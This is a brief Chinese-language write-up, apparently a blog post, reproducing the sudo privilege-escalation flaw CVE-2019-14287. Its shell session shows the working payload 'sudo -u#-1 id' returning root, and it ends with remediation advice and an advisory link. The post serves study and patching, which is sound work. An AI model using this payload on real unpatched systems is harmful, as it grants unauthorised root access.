# [漏洞复现]CVE-2019-14287 sudo提权漏洞
### 漏洞描述
2019年10月14日，CVE官方发布了CVE-2019-14287的漏洞预警。通过特定payload，用户可提升至root权限。

**利用前提**
1. sudo -v < 1.8.28
2. 知道当前用户的密码
3. 当前用户存在于sudo权限列表
### 漏洞复现

```shell
mark@mark-Pc:~$ id
uid=1000(mark) gid=1000(mark) 组=1000(mark),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
mark@mark-Pc:~$ sudo -u#-1 id
[sudo] mark 的密码： 
uid=0(root) gid=1000(mark) 组=1000(mark)
```
### 修复建议
1. 升级sudo到1.8.28版本
2. 做好sudo用户列表管理

**参考**

https://www.sudo.ws/alerts/minus_1_uid.html